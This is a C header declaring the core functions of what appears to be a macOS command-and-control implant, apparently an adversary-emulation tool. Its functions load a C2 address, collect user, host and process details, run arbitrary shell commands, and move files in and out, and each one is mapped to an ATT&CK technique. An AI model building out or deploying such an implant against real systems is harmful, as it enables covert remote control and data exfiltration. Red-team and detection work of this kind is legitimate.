#ifndef CORE_H
#define CORE_H

// LoadConfig
//      About:
//          Searches for and loads the configuration file via NSFileManager then
//          stores the C2 server address and UUID
//      Result:
//          Updates Communication::Settings::C2_Address with the parsed URL from
//          the configuration file
//      Returns:
//          Boolean true if the configuration was loaded successfully, false if
//          an error occurred
bool LoadConfig();

// GetUserName
//      About:
//          Uses NSUserName API to retrieve and convert username to char array
//      Result:
//          Gets the username of the current process
//      Returns:
//          const char array containing username of the current process
//      ATT&CK Techniques:
//          T1033 System Owner/User Discovery
const char * GetUserName();

// GetHostName
//      About:
//          Uses NSHost API to retrieve and convert hostname to char array
//      Result:
//          Gets the hostname
//      Returns:
//          const char array containing hostname
//      ATT&CK Techniques:
//          T1082 System Information Discovery
const char * GetHostName();

// GetPID
//      About:
//          Uses NSProcessInfo API to retrieve process ID
//      Result:
//          Gets the PID of the current process
//      Returns:
//          int containing PID of the current process
//      ATT&CK Techniques:
//          T1057 Process Discovery
int GetPID();

// ExecuteCmd
//      About:
//          Uses NSTask API and zsh to execute arbitrary commands and NSPipe to capture STDOUT and STDERR
//      Result:
//          Command is executed and output is returned
//      Returns:
//          const char * containing the output
//      ATT&CK Techniques:
//          T1106 Native API
//          T1059.004 Command and Scripting Interpreter: Unix Shell
//      Resources:
//          https://stackoverflow.com/questions/3444178/nstask-nspipe-objective-c-command-line-help
const char * ExecuteCmd(const char * cmd);

// DownloadFile
//      About:
//          Writes the given file bytes to the given file path using NSFileManager
//      Result:
//          Writes file at path
//      Returns:
//          bool true if success, false otherwise
//      ATT&CK Techniques:
//          T1105 Ingress Tool Transfer
bool DownloadFile(unsigned char * file_bytes, int file_size, const char * file_path);

// UploadFile
//      About:
//          Reads the file at the path using NSFileManager and returns the
//          base64 encoded bytes
//      Result:
//          Reads file at path
//      Returns:
//          char array containing base64 encoded bytes
//      ATT&CK Techniques:
//          T1041 Exfiltration Over C2 Channel
char * UploadFile(const char * file_path);

#endif